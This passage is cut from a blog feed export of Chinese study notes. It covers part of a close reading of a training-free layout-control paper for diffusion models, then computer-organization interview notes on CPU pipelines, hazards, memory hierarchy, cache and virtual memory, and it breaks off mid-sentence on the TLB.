src="/2024/08/15/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB2%EF%BC%9ATraining-Free-Layout-Control-with-Cross-Attention-Guidance/image_bg5Cyc4_mY.png"></p><p>在表 3 中，我们将我们的反向指导与其他布局条件机制进行了比较。除了最后两行的条目外，所有方法都基于Stable Diffusion V1.5[40]。值得注意的是，我们的反向引导大大超过了其他布局条件反射方法，在<code>COCO</code>和<code>Flickr30K</code>上实现了<code>mAP</code>和<code>APP</code>的9点改进。值得注意的是，与并发<code>BoxDiff</code>模型[50]直接比较，我们在<code>MAP</code>和<code>APP</code>中获得了11.6的增益，在保持类似的图像质量的同时，都获得了9.6的增益。最后，我们表明我们的方法可以互补地用于 <code>GLIGEN</code>[27] 等方法，这些方法训练额外的层进行布局调节，进一步提高了它们的性能。</p><p><img src="/2024/08/15/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB2%EF%BC%9ATraining-Free-Layout-Control-with-Cross-Attention-Guidance/image_Pw-lNa5BFz.png"></p><blockquote><p>图6：不同文本到图像模型与[16]中定义的文本提示的定性比较。如 [16] 中所述，当前的文本到图像模型无法在没有显式布局调节的情况下理解空间关系。然而，我们在交叉注意图的指导下实现了对生成的图像的控制。</p></blockquote><p>在图 6 中，我们使用从 [16] 采样的提示定性地比较不同的文本到图像模型。不使用布局控制的方法不能纯粹基于文本输入来推断对象之间的空间关系，并且通常无法生成一个或两个对象。我们还观察到，即使是布局条件反射的方法在这种情况下也很困难，尤其是那些采用前向引导范式的方法（<code>eDiff-I</code> [2]、<code>HFG</code>[45]）。在 <code>BoxDiff</code>[50] 的情况下，较低的质量可能是由于忽略了特殊标记和损失函数设计的影响。相比之下，我们的方法（后向引导 SD）可以准确地定位场景中的对象，即使它们很少一起看到，例如“雪板”和“碗”，并且在不损失图像保真度的情况下实现了对提示的最佳依从性。</p><p><img src="/2024/08/15/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB2%EF%BC%9ATraining-Free-Layout-Control-with-Cross-Attention-Guidance/image_kqoX1UB7qt.png"></p><blockquote><p>图7：我们的方法使用用户指定的边界框控制生成的图像内的对象。左边，火烈鸟的大小和位置根据边界框而变化。在右边，我们展示了控制多个对象的能力。</p></blockquote><p>我们的方法的更多示例如图 7 所示，展示了对一个或多个对象的大小和位置的精确控制，包括非常规对象类别，例如“火烈鸟”或“皮卡丘”和非典型场景组合。</p><h2 id="5-4-进一步的分析和应用"><a href="#5-4-进一步的分析和应用" class="headerlink" title="5.4 进一步的分析和应用"></a>5.4 进一步的分析和应用</h2><h3 id="5-4-1-真实图像布局编辑"><a href="#5-4-1-真实图像布局编辑" class="headerlink" title="5.4.1 真实图像布局编辑"></a>5.4.1 真实图像布局编辑</h3><p><img src="/2024/08/15/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB2%EF%BC%9ATraining-Free-Layout-Control-with-Cross-Attention-Guidance/image_93JvEwiE_q.png"></p><blockquote><p>图8：左上角是真实图像输入。虚线上方的图像仅使用文本反转 (TI) [15] 和 <code>Dreambooth</code>[42] 生成。虚线下的图像是由我们的方法在<code>Dreambooth</code>和TI之上生成的。</p></blockquote><p>我们在图 8 中展示了反向布局指导编辑真实图像的潜力，证实了它在改变“狗”的位置、手势和方向（基于边界框的纵横比）以适应新上下文方面的有效性，而不改变其身份。如图所示，仅通过 <code>Dreambooth/TI</code> 无法实现精确控制对象大小和位置的能力，这突出了我们的方法在与图像编辑和操作相关的广泛应用中的潜力。</p><h3 id="5-4-2-交叉注意力层和指导步骤"><a href="#5-4-2-交叉注意力层和指导步骤" class="headerlink" title="5.4.2 交叉注意力层和指导步骤"></a>5.4.2 交叉注意力层和指导步骤</h3><p><img src="/2024/08/15/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB2%EF%BC%9ATraining-Free-Layout-Control-with-Cross-Attention-Guidance/image_s7Ecq3UP6D.png"></p><blockquote><p>图 9：单词“cat”在不同时间步（从左到右）的不同层（从上到下）的交叉注意力图。</p></blockquote><p>我们还研究了实现布局控制所需的层和引导步骤的数量。去噪网络各层的交叉注意图如图9所示。我们观察到（下采样）的第一层没有捕捉到关于对象的太多信息（这里是“猫”）。我们发现仅在架构的中间和上采样块上执行反向指导最有效。该图还说明了对象轮廓通常在扩散过程的早期步骤中生成，在 T &#x3D; 20 之前。根据我们的实验，我们发现 10-20 步通常适合指导。补充中给出了额外的定量分析和示例。</p><h3 id="5-4-3-损失比例因子"><a href="#5-4-3-损失比例因子" class="headerlink" title="5.4.3 损失比例因子"></a>5.4.3 损失比例因子</h3><p><img src="/2024/08/15/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB2%EF%BC%9ATraining-Free-Layout-Control-with-Cross-Attention-Guidance/image_7F_LAShwdv.png"></p><blockquote><p>图10：反向制导中不同损耗尺度的定性比较。我们从左到右增加损失尺度，保持相同的提示和随机种子。随着规模的增加，对象更紧密地约束在边界框内。然而，对于非常高的尺度，保真度显着下降。</p></blockquote><p>在图 10 中，我们定性地分析了损失比例因子$  η  $的影响。我们观察到，增加损失权重会导致对生成的图像进行更强的控制，但代价是一些保真度，特别是在更高的尺度上。最佳损失规模设置取决于文本提示的难度。例如，像“熊上方的出水口”这样的非典型提示需要更强的指导才能成功生成这两个对象（没有指导，即$ η &#x3D; 0$，没有生成熊）。这表明布局引导有助于生成器“识别”文本提示中的多个对象。</p><hr><h1 id="6-Conclusions"><a href="#6-Conclusions" class="headerlink" title="6 Conclusions"></a>6 Conclusions</h1><p>在本文中，我们研究了在没有额外训练或微调的情况下操纵大型预训练文本到图像模型生成的图像的空间布局的潜力。通过我们的探索，我们发现交叉注意图和扩散的初始噪声在确定布局方面起着主导作用，即使是特殊标记的交叉注意图也包含有价值的语义和空间信息。我们识别和分析了大多数先前工作背后的机制：前向指导。此外，基于我们的分析，我们提出了一种新的技术“后向引导”，克服了前向引导的缺点。最后，我们通过将无训练策略扩展到真实图像布局编辑等应用程序来展示我们的无训练策略的通用性。</p><p>我们以与其术语兼容的方式使用 <code>Flick30K</code>实体和 <code>MS-COCO</code> 数据集。其中一些图像可能会意外包含人脸或其他个人信息，但我们不使用这些图像或图像区域。有关伦理、数据保护和版权的更多详细信息，请参阅 <a href="https://www.robots.ox.ac.uk/%20%CC%83vedaldi/research/%20union/ethics.html" title="https://www.robots.ox.ac.uk/ ̃vedaldi/research/ union/ethics.html">https://www.robots.ox.ac.uk/ ̃vedaldi/research/ union/ethics.html</a> 。</p><hr><h1 id="7-Appendix"><a href="#7-Appendix" class="headerlink" title="7 Appendix"></a>7 Appendix</h1><p>本附录包含以下部分：</p><ol><li><strong>实施细节</strong>：我们提供了实验设置的更多细节，包括网络架构和噪声调度器。</li><li><strong>评估数据集和指标</strong>：我们提供了实验部分使用的数据集和评估指标的详细信息。</li><li><strong>消融实验</strong>：进行了详细的定量评估，以了解各种组件和超参数选择的影响。我们研究了引导步骤、特定层损失和后向引导损失比例因子的影响。</li><li><strong>初始噪声分析</strong>：我们证明了具有相同初始噪声的不同提示生成的图像具有相似的布局。因此，对初始噪声的良好选择对于指导的成功至关重要。此外，我们定量地证明，在交叉注意上使用定义的损失可以实现最佳的初始噪声选择，提高制导性能。</li><li><strong>不同tokens分析</strong>：我们可视化不同提示的交叉注意力图，并为仅使用填充标记控制生成图像布局提供了额外的实验。</li><li><strong>更多例子</strong>：我们提供了我们方法的额外示例，包括VISOR[16]协议和真实图像编辑示例下的示例。</li></ol><h2 id="7-1-实现细节"><a href="#7-1-实现细节" class="headerlink" title="7.1 实现细节"></a>7.1 实现细节</h2><p>我们提供了我们的实验设置的更多细节。</p><h3 id="7-1-1-网络架构"><a href="#7-1-1-网络架构" class="headerlink" title="7.1.1 网络架构"></a>7.1.1 网络架构</h3><p>在所有实验中，我们使用稳定扩散 (SD) V-1.5 [39] 作为我们的基础模型，无需任何架构修改。扩散模型在自动编码器的潜在空间中进行训练。具体来说，扩散模型采用相对下采样因子为8的U-Net[41]架构。U-Net的下采样分支有三个顺序交叉注意块。U-Net 的中间部分只有一个交叉注意力块。U-Net 的上采样分支具有三个顺序交叉注意力块。在每个交叉注意力块中，按照以下顺序重复层：ResBlock → Self-Attention → Cross-Attention。下采样分支、中间部分和上采样中的交叉注意力块分别有 2、1 和 3 个这样的重复模式。</p><h3 id="7-1-2-噪声调度器"><a href="#7-1-2-噪声调度器" class="headerlink" title="7.1.2 噪声调度器"></a>7.1.2 噪声调度器</h3><p><code>LMSDscheudler</code>在我们所有的实验中都使用 51 个时间步长和 beta 值，从 0.00085 开始并以 0.012 结束，遵循线性调度器。我们还采用无类指导，如 [21] 中所建议的，引导范围为 7.5，与之前的工作 [39] 一致。</p><h2 id="7-2-评估数据集和指标"><a href="#7-2-评估数据集和指标" class="headerlink" title="7.2 评估数据集和指标"></a>7.2 评估数据集和指标</h2><h3 id="7-2-1-VISOR"><a href="#7-2-1-VISOR" class="headerlink" title="7.2.1 VISOR"></a>7.2.1 VISOR</h3><p>我们遵循[16]中描述的评估过程来计算VISOR度量，该度量旨在量化文本到图像模型的空间理解能力。该指标侧重于两个对象之间的二维关系，例如左、右、上、下等。我们测量对象精度 (<code>OA</code>)，即生成的图像包含文本提示中指定的两个对象的概率。<code>VISOORuncond</code>是生成具有正确空间关系的对象的概率，<code>VISORcond</code>是生成正确空间关系的条件概率，因为这两个对象都是正确生成的。为了生成用于评估的文本提示，我们使用来自 MS COCO 数据集 [29] 的 80 个对象类别，考虑到每个空间关系的两个对象类别的任何组合，总共有 80 × 79 × 4 &#x3D;25,280 个提示。对于每个提示，我们生成单个图像。作为布局引导输入，我们将图像画布分为垂直或水平两个，根据文本提示定义的空间关系类型创建两个相邻的边界框。这仅对布局施加了弱约束，并且可以自动完成（不需要用户干预）。为了与之前在[16]中评估的方法进行公平的比较，我们在计算VISOR度量时使用与[16]相同的检测模型(OWL-ViT[31])。</p>]]></content>
      
      
      <categories>
          
          <category> 科研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> layout-guidance </tag>
            
            <tag> 论文精读 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计组面经3：指令系统和CPU</title>
      <link href="/2024/08/14/%E8%AE%A1%E7%BB%84%E9%9D%A2%E7%BB%8F3%EF%BC%9A%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F%E5%92%8CCPU/"/>
      <url>/2024/08/14/%E8%AE%A1%E7%BB%84%E9%9D%A2%E7%BB%8F3%EF%BC%9A%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F%E5%92%8CCPU/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/08/14/%E8%AE%A1%E7%BB%84%E9%9D%A2%E7%BB%8F3%EF%BC%9A%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F%E5%92%8CCPU/image_volxRUVCXp.png"></p><p><img src="/2024/08/14/%E8%AE%A1%E7%BB%84%E9%9D%A2%E7%BB%8F3%EF%BC%9A%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F%E5%92%8CCPU/image_ZGkoCo21gH.png"></p><h1 id="1-指令流水线的基本概念"><a href="#1-指令流水线的基本概念" class="headerlink" title="1 指令流水线的基本概念"></a>1 指令流水线的基本概念</h1><h2 id="1-1-流水线基本原理"><a href="#1-1-流水线基本原理" class="headerlink" title="1.1 流水线基本原理"></a>1.1 流水线基本原理</h2><p>流水线技术是一种显著提高指令执行速度与效率的技术。方法是：指令取指完成后，不等该指令执行完毕即可取下一条指令。如果把一条指令的解释过程进一步细分，例如分成取指、译码、访存、执行和写回五个子过程，并用五个子部件分别处理这五个子过程。</p><p>这样只需在上一指令的第一子过程处理完毕进入第二子过程处理时，在第一子部件中就开始对第二条指令的第一子过程进行处理。随着时间推移，这种重叠操作最后可达到五个子部件同时对五条指令的子过程进行操作。</p><h2 id="1-2-典型的五级流水线的数据通路"><a href="#1-2-典型的五级流水线的数据通路" class="headerlink" title="1.2 典型的五级流水线的数据通路"></a>1.2 典型的五级流水线的数据通路</h2><p><img src="/2024/08/14/%E8%AE%A1%E7%BB%84%E9%9D%A2%E7%BB%8F3%EF%BC%9A%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F%E5%92%8CCPU/image_sjTubjABp0.png"></p><h2 id="1-3-流水线方式的特点"><a href="#1-3-流水线方式的特点" class="headerlink" title="1.3 流水线方式的特点"></a>1.3 流水线方式的特点</h2><p>与传统的串行执行方式相比，采用流水线方式具有如下特点：</p><ol><li>把一个任务（一条指令或一个操作）分解为几个有联系的子任务，每个子任务由一个专门的功能部件来执行，并依靠多个功能部件并行工作来缩短程序的执行时间。</li><li>流水线每个功能段部件后面都要有一个缓冲寄存器，或称<strong>锁存器</strong>，其作用是保存本流水段的执行结果，供给下一流水段使用。</li><li><strong>流水线中各功能段的时间应尽量相等</strong>，否则将引起堵塞、断流。</li><li>只有连续不断地提供同一种任务时才能发挥流水线的效率，所以在流水线中处理的必须是连续任务。在采用流水线方式工作的处理机中，要在软件和硬件设计等多方面尽量为流水线提供连续的任务。</li><li>流水线需要有<strong>装入时间</strong>和<strong>排空时间</strong>。装入时间是指第一个任务进入流水线到输出流水线的时间。排空时间是指最后一个任务进入流水线到输出流水线的时间。</li></ol><h2 id="1-4-影响流水线性能的因素"><a href="#1-4-影响流水线性能的因素" class="headerlink" title="1.4 影响流水线性能的因素"></a>1.4 影响流水线性能的因素</h2><p><strong>结构相关</strong>是当多条指令同一时刻争用同一资源形成冲突。</p><p>解决方案：</p><ol><li>暂停一个时钟周期</li><li>单独设置数据存储器和指令存储器</li></ol><p><strong>数据相关</strong>是指令在流水线中重叠执行时，当后继指令需要用到前面指令的执行结果时发生的。</p><p>解决方案：</p><ol><li>暂停一个时钟周期</li><li>数据旁路：把前一条指令的<code>ALU</code>计算结果直接输入到下一条指令</li></ol><p><strong>控制相关</strong>是当流水线遇到分支指令和其他改变PC值的指令时引起的。</p><p>解决方案：</p><ol><li>延迟转移技术。将转移指令与其前面的与转移指令无关的一条或几条指令对换位置，让成功转移总是在紧跟的指令被执行之后发生，从而使预取的指令不作废</li><li>转移预测技术</li></ol><hr><h1 id="2-CISC和RISC的对比"><a href="#2-CISC和RISC的对比" class="headerlink" title="2 CISC和RISC的对比"></a>2 CISC和RISC的对比</h1><p><img src="/2024/08/14/%E8%AE%A1%E7%BB%84%E9%9D%A2%E7%BB%8F3%EF%BC%9A%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F%E5%92%8CCPU/image_3berkM5o2P.png"></p><hr><h1 id="3-CPU-的功能"><a href="#3-CPU-的功能" class="headerlink" title="3 CPU 的功能"></a>3 CPU 的功能</h1><p>中央处理器（CPU）由运算器和控制器组成。其中，控制器的功能是负责协调并控制计算机各部件执行程序的指令序列，包括取指令、分析指令和执行指令；运算器的功能是对数据进行加工。</p><p>CPU 的具体功能包括：</p><ol><li><strong>指令控制</strong>：完成取指令、分析指令和执行指令的操作，即程序的顺序控制。</li><li><strong>操作控制</strong>：一条指令的功能往往由若干操作信号的组合来实现。CPU 管理并产生由内存取出的每条指令的操作信号，把各种操作信号送往相应的部件，从而控制这些部件按指令的要求进行动作。</li><li><strong>时间控制</strong>：对各种操作加以时间上的控制。时间控制要为每条指令按时间顺序提供应有的控制信号。</li><li><strong>数据加工</strong>：对数据进行算术和逻辑运算。</li><li><strong>中断处理</strong>：对计算机运行过程中出现的异常情况和特殊请求进行处理。</li></ol><hr><h1 id="4-是否流水段越多，指令执行越快？"><a href="#4-是否流水段越多，指令执行越快？" class="headerlink" title="4 是否流水段越多，指令执行越快？"></a>4 是否流水段越多，指令执行越快？</h1><p>错误，原因如下:</p><ol><li>流水段缓冲之间的额外开销增大。每个流水段有一些额外开销用于缓冲间传送数据、进行各种准备和发送等功能，这些开销加长了一条指令的整个执行时间，当指令间逻辑上相互依赖时，开销更大</li><li>流水段间控制逻辑变多、变复杂。用于流水线优化和存储器（或寄存器）冲突处理的控制逻辑</li></ol><p>将随流水段的增加而大增，这可能导致用于流水段之间控制的逻辑比段本身的控制逻辑更复杂。</p><hr><h1 id="5-有关指令相关、数据相关的几个概念"><a href="#5-有关指令相关、数据相关的几个概念" class="headerlink" title="5 有关指令相关、数据相关的几个概念"></a>5 有关指令相关、数据相关的几个概念</h1><ol><li>两条连续的指令读取相同的寄存器时，会产生<strong>读后读（Read After Read，RAR）相关</strong>，这种相关不会影响流水线。</li><li>某条指令要读取上一条指令所写入的寄存器时，会产生<strong>写后读（Read After Write, RAW）相关</strong>，它称数据相关或真相关，影响流水线。按序流动的流水线只可能出现RAW 相关。</li><li>某条指令的上条指令要读／写该指令的输出寄存器时，会产生<strong>读后写（Write After Read，WAR）相关</strong>和<strong>写后写（Write After Write，WAW）相关</strong>。在非按序流动的流水线中，既可能发生RAW 相关，又可能发生WAR 相关和WAW 相关。</li></ol><p>对流水线影响最严重的指令相关是<strong>数据相关</strong>。</p>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面经 </tag>
            
            <tag> 计算机组成原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计组面经2：存储系统</title>
      <link href="/2024/08/12/%E8%AE%A1%E7%BB%84%E9%9D%A2%E7%BB%8F2%EF%BC%9A%E5%AD%98%E5%82%A8%E7%B3%BB%E7%BB%9F/"/>
      <url>/2024/08/12/%E8%AE%A1%E7%BB%84%E9%9D%A2%E7%BB%8F2%EF%BC%9A%E5%AD%98%E5%82%A8%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/08/12/%E8%AE%A1%E7%BB%84%E9%9D%A2%E7%BB%8F2%EF%BC%9A%E5%AD%98%E5%82%A8%E7%B3%BB%E7%BB%9F/image_3efGlafd0O.png"></p><h1 id="1-多级存储系统？"><a href="#1-多级存储系统？" class="headerlink" title="1 多级存储系统？"></a>1 多级存储系统？</h1><p>为了解决存储系统大容量、高速度和低成本 3 个相互制约的矛盾，在计算机系统中，通常采用多级存储器结构，在图中由上至下，位价越来越低，速度越来越慢，容量越来越大， CPU 访问的频度也越来越低。</p><p><img src="/2024/08/12/%E8%AE%A1%E7%BB%84%E9%9D%A2%E7%BB%8F2%EF%BC%9A%E5%AD%98%E5%82%A8%E7%B3%BB%E7%BB%9F/image_2XKv8wo1dv.png"></p><p>实际上，存储系统层次结构主要体现在“Cache-主存”层次和“主存－辅存”层次。前者主要解决<strong>CPU和主存速度不匹配</strong>的问题，后者主要解决<strong>存储系统的容量</strong>问题。在存储体系中， Cache 、主存能与 CPU 直接交换信息，辅存则要通过主存与CPU 交换信息；主存与CPU 、Cache 、辅存都能交换信息。</p><p>存储器层次结构的主要思想是<strong>上一层的存储器作为低一层存储器的高速缓存</strong>。从 CPU 的角度看，”Cache—主存”层次速度接近于Cache，容量和位价却接近千主存。从“主存—辅存”层次分析，其速度按近于主存，容址和位价动接近于辅存。这就解决了速度、容量、成本这三者之间的矛盾。</p><p>在“主存—辅存”这一层次的不断发展中，逐渐形成了<strong>虚拟存储系统</strong>，在这个系统中程序员编程的地址范围与虚拟存储器的地址空间相对应。对具有虚拟存储器的计算机系统而言，编程时可用的地址空间远大于主存间。</p><hr><h1 id="2-半导体随机存储器"><a href="#2-半导体随机存储器" class="headerlink" title="2 半导体随机存储器"></a>2 半导体随机存储器</h1><p>主存储器由DRAM 实现，靠处理器的那一层（Cache）则由<code>SRAM </code>实现，它们都属于易失性存储器，只要电源被切断，原来保存的信息便会丢失。DRAM 的每比特成本低千<code>SRAM</code>，速度也慢于<code>SRAM</code>，价格差异主要是因为制造DRAM 需要更多的硅。而ROM 属千非易失性存储器。</p><h2 id="2-1-SRAM-的工作原理"><a href="#2-1-SRAM-的工作原理" class="headerlink" title="2.1 SRAM 的工作原理"></a>2.1 SRAM 的工作原理</h2><p>通常把存放一个二进制位的物理器件称为存储元，它是存储器的最基本的构件。地址码相同时多个存储元构成一个存储单元。若干存储单元的集合构成存储体。</p><p>静态随机存储器（<code>SRAM</code>）的存储元是用双稳态触发器（六晶体管MOS）来记忆信息的，因此即使信息被读出后，它仍保持其原状态而不需要再生（非破坏性牍出）。<code>SRAM</code>的存取速度快，但集成度低，功耗较大，所以一般用来组成高速缓冲存储器。</p><h2 id="2-2-DRAM-的工作原理"><a href="#2-2-DRAM-的工作原理" class="headerlink" title="2.2 DRAM 的工作原理"></a>2.2 DRAM 的工作原理</h2><p>与<code>SRAM</code>的存储原理不同，动态随机存储器（DRAM）是利用<strong>存储元电路中栅极电容上的电荷</strong>来存储信息的， DRAM 的基本存储元通常只使用一个晶体管，所以它比<code>SRAM</code>的密度要高很多。DRAM 采用地址复用技术，地址线是原来的1&#x2F;2，且地址信号分行、列两次传送。</p><p>相对于<code>SRAM</code>来说， DRAM 具有容易集成、位价低、容量大和功耗低等优点，但DRAM 的存取速度比<code>SRAM</code>的慢，一般用来组成大容量主存系统。DRAM 电容上的电荷一般只能维持1~2ms, 因此即使电源不断电，信息也会自动消失。</p><p>为此，每隔一定时间必须刷新，通常取<code>2ms</code>, 这个时间称为刷新周期。常用的刷新方式有3 种：集中刷新、分散刷新和异步刷新。</p><h2 id="2-3-只读存储器-ROM-的特点"><a href="#2-3-只读存储器-ROM-的特点" class="headerlink" title="2.3 只读存储器(ROM)的特点"></a>2.3 只读存储器(ROM)的特点</h2><p>ROM 和RAM 都是支持随机存取的存储器，其中SRAM 和DRAM 均为易失性半导体存储器。而ROM 中一旦有了信息，就不能轻易改变，即使掉电也不会丢失，它在计算机系统中是只供读出的存储器。ROM 器件有两个显著的优点：</p><ol><li>结构简单，所以位密度比可读写存储器的高</li><li>具有非易失性，所以可靠性高</li></ol><hr><h1 id="3-有哪些技术能够提高CPU访存速度？"><a href="#3-有哪些技术能够提高CPU访存速度？" class="headerlink" title="3 有哪些技术能够提高CPU访存速度？"></a>3 有哪些技术能够提高CPU访存速度？</h1><p>为了提高CPU 访问存储器的速度，可以采用<strong>双端口存储器</strong>、<strong>多模块存储器</strong>等技术，它们同属并行技术，前者为空间并行，后者为时间并行。</p><h2 id="3-1-双端口RAM"><a href="#3-1-双端口RAM" class="headerlink" title="3.1 双端口RAM"></a>3.1 双端口RAM</h2><p>双端口RAM 是指同一个存储器有左、右两个独立的端口，分别具有两组相互独立的地址线、数据线和读写控制线，允许两个独立的控制器同时异步地访问存储单元，如图所示。当两个端口的地址不相同时，在两个端口上进行读写操作一定不会发生冲突。</p><p><img src="/2024/08/12/%E8%AE%A1%E7%BB%84%E9%9D%A2%E7%BB%8F2%EF%BC%9A%E5%AD%98%E5%82%A8%E7%B3%BB%E7%BB%9F/image_I4U95bE2Q4.png"></p><h2 id="3-2-多模块存储器"><a href="#3-2-多模块存储器" class="headerlink" title="3.2 多模块存储器"></a>3.2 多模块存储器</h2><p>为提高访存速度，常采用<strong>多模块存储器</strong>，常用的有<strong>单体多字存储器</strong>和<strong>多体低位交叉存储器</strong>。</p><p>注意： CPU 的速度比存储器的快，若同时从存储器中取出n 条指令，就可充分利用CPU 资源，提高运行速度。多体交叉存储器就是基于这种思想提出的。</p><h3 id="3-2-1-单体多字存储器"><a href="#3-2-1-单体多字存储器" class="headerlink" title="3.2.1 单体多字存储器"></a>3.2.1 单体多字存储器</h3><p><img src="/2024/08/12/%E8%AE%A1%E7%BB%84%E9%9D%A2%E7%BB%8F2%EF%BC%9A%E5%AD%98%E5%82%A8%E7%B3%BB%E7%BB%9F/image_McbRIDkeah.png"></p><p>单体多字系统的特点是存储器中只有一个存储体，每个存储单元存储m 个字，总线宽度也为m 个字。一次并行读出m 个字，地址必须顺序排列并处于同一存储单元。<strong>单体多字系统在一个存取周期内从同一地址取出m条指令，然后将指令逐条送至CPU执行</strong>，即每隔1&#x2F;m 存取周期， CPU 向主存取一条指令。显然，这增大了存储器的带宽，提高了单体存储器的工作速度。</p><p><strong>缺点</strong>：指令和数据在主存内必须是连续存放的，一旦遇到转移指令，或操作数不能连续存放，这种方法的效果就不明显。</p><h3 id="3-2-2-多体并行存储器"><a href="#3-2-2-多体并行存储器" class="headerlink" title="3.2.2 多体并行存储器"></a>3.2.2 多体并行存储器</h3><p>多体并行存储器由多体模块组成。每个模块都有相同的容量和存取速度，各模块都有独立的读写控制电路、地址寄存器和数据寄存器。它们既能并行工作，又能交叉工作。</p><p>多体并行存储器分为<strong>高位交叉编址</strong>（顺序方式）和<strong>低位交叉编址</strong>（交叉方式）两种。</p><p><img src="/2024/08/12/%E8%AE%A1%E7%BB%84%E9%9D%A2%E7%BB%8F2%EF%BC%9A%E5%AD%98%E5%82%A8%E7%B3%BB%E7%BB%9F/image_yulx-VP422.png"></p><p><img src="/2024/08/12/%E8%AE%A1%E7%BB%84%E9%9D%A2%E7%BB%8F2%EF%BC%9A%E5%AD%98%E5%82%A8%E7%B3%BB%E7%BB%9F/image_6GAXtbPiWE.png"></p><hr><h1 id="4-Cache"><a href="#4-Cache" class="headerlink" title="4 Cache"></a>4 Cache</h1><p>Cache存储器：电脑中为高速缓冲存储器，是位于CPU和主存储器DRAM（Dynamic RandomAccess Memory）之间，规模较小，但速度很高的存储器，通常由<code>SRAM</code>（Static Random Access Memory静态存储器）组成。</p><p>Cache的功能是提高CPU数据输入输出的速率。Cache容量小但速度快，内存速度较低但容量大，通过优化调度算法，系统的性能会大大改善，仿佛其存储系统容量与内存相当而访问速度近似Cache。</p><p>Cache通常采用相联存储器，使用Cache改善系统性能的依据是<strong>程序的局部性原理</strong>。</p><h2 id="4-1-替换算法"><a href="#4-1-替换算法" class="headerlink" title="4.1 替换算法"></a>4.1 替换算法</h2><p>当Cache产生了一次访问未命中之后，相应的数据应同时读入CPU和Cache。但是当Cache已存满数据后，新数据必须替换（淘汰）Cache中的某些旧数据。最常用的替换算法有随机算法、先进先出算法（FIFO）和近期最少使用算法（LRU）。</p><h2 id="4-2-写操作"><a href="#4-2-写操作" class="headerlink" title="4.2 写操作"></a>4.2 写操作</h2><p>因为需要保证缓存在Cache中的数据与内存中的内容一致，Cache的写操作比较复杂，常用的有写直达法和写回法。</p><p>写直达法：在这个策略里，每一次数据都要写入到主内存里面。写入前，先去判断数据是否已经在 Cache 里面了。如果数据已经在 Cache 里面了，先把数据写入更新到 Cache 里面，再写入到主内存里面；如果数据不在 Cache 里，就只更新主内存。写直达的这个策略很直观，但是问题也很明显，那就是这个策略很慢。无论数据是不是在 Cache 里面，我们都需要始终把数据同步到主内存里面。</p><p>写回法：信息仅仅写到Cache中的块。当其被替换时，信息才会被写回到主存中。虚拟存储器系统通常采用写回策略，因为写到磁盘的延迟代价太大。</p><p>写回的速度要更快一些，因为不必每次写操作都访问主存。但这样我们如何保证一致性问题呢？我们可以给每行添加一个脏位（dirty bit），这样我们替换这块Cache时就可以根据脏位来判断是否需要写回主存。如果没有被“弄脏过”，那么就不需要写回主存。</p><h2 id="4-3-与主存的映射方式"><a href="#4-3-与主存的映射方式" class="headerlink" title="4.3 与主存的映射方式"></a>4.3 与主存的映射方式</h2><p>直接映射：主存数据块只能装入Cache中的唯一位置</p><p>全相联映射：可以把主存数据块装入Cache 中的任何位置</p><p>组相联映射：将Cache分为若干组，一个数据块可以装入一组内的任何一个位置</p><hr><h1 id="5-虚拟存储器"><a href="#5-虚拟存储器" class="headerlink" title="5 虚拟存储器"></a>5 虚拟存储器</h1><h2 id="5-1-虚拟存储器的基本概念"><a href="#5-1-虚拟存储器的基本概念" class="headerlink" title="5.1 虚拟存储器的基本概念"></a>5.1 虚拟存储器的基本概念</h2><p>虚拟存储器是指具有请求调入和置换功能，能从逻辑上对内存容量加以扩存的一种存储器系统。</p><h2 id="5-2-页式虚拟存储器"><a href="#5-2-页式虚拟存储器" class="headerlink" title="5.2 页式虚拟存储器"></a>5.2 页式虚拟存储器</h2><p>页式管理：是把虚拟存储空间和实际空间等分成固定大小的页，各虚拟页可装入主存中的不同实际页面位置。页式存储中，处理机逻辑地址由<strong>虚页号</strong>和<strong>页内地址</strong>两部分组成，实际地址也分为页号和页内地址两部分,由地址映射机构将虚页号转换成主存的实际页号。</p><p>页式管理用一个页表，包括页号，每页在主存中起始位置、装入位等。页表是虚拟页号与物理页号的映射表，页式管理由操作系统进行，对应用程序员的透明的。</p><h2 id="5-3-段式虚拟存储器"><a href="#5-3-段式虚拟存储器" class="headerlink" title="5.3 段式虚拟存储器"></a>5.3 段式虚拟存储器</h2><p><strong>段式管理</strong>：把主存按段分配的存储管理方式。它是一种模块化的存储管理方式，每个用户程序模块可分到一个段，该程序模块只能访问分配给该模块的段所对应的主存空间。段长可以任意设定，并可放大和缩小。</p><p>系统中<strong>通过一个段表指明各段在主存中的位置</strong>。段表中包括段名（段号）、段起点、装入位和段长等。段表本身也是一个段，段一般是按程序模块分的。</p><h2 id="5-4-段页式虚拟存储器"><a href="#5-4-段页式虚拟存储器" class="headerlink" title="5.4 段页式虚拟存储器"></a>5.4 段页式虚拟存储器</h2><p>段页式管理：是上述两种方法的结合，它将存储空间按逻辑模块分成段，每段又分成若干个页，访存通过一个段表和若干个页表进行，段的长度必须是页长的整数倍，段的起点必须是某一页的起点。</p><h2 id="5-5-TLB-快表"><a href="#5-5-TLB-快表" class="headerlink" title="5.5 TLB(快表)"></a>5.5 TLB(快表)</h2><p>在虚拟存储器中进行地址变换时，需要<strong>虚页号变换成主存中实页号的内部地址变换</strong>这一过程。</p><p>缓存时首先要到主存查页表，然后才能根据主存物理地址访问主存的存取指令或数据。因此采用虚拟存储器机制后，访存的次数增加了。为了减少访存的次数，往往将页表中最活跃的几个页表项复制到高速缓存中。这种在高速缓存中的页表项称为快表（translation look aside 